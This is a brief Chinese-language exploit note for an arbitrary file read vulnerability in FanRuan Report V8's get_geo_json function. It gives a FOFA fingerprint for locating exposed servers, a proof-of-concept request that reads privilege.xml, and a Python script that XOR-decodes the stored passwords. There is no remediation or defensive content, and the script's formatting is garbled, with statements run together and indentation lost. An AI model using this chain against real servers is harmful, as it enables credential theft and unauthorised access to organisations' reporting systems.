## 帆软报表 V8 get_geo_json 任意文件读取漏洞

## fofa
```
body="isSupportForgetPwd"

```

## poc
```
WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml
```

获得账号密码后进行解密，解密脚本如下
## 解密脚本
```python
cipher = 'XXXXXXXXXXX' #密文
PASSWORD_MASK_ARRAY = [19, 78, 10, 15, 100, 213, 43, 23]
Password = "" cipher = cipher[3:]
for i in range(int(len(cipher) / 4)):
c1 = int("0x" + cipher[i * 4:(i + 1) * 4], 16)
c2 = c1 ^ PASSWORD_MASK_ARRAY[i % 8]
Password = Password + chr(c2)
print (Password)
```
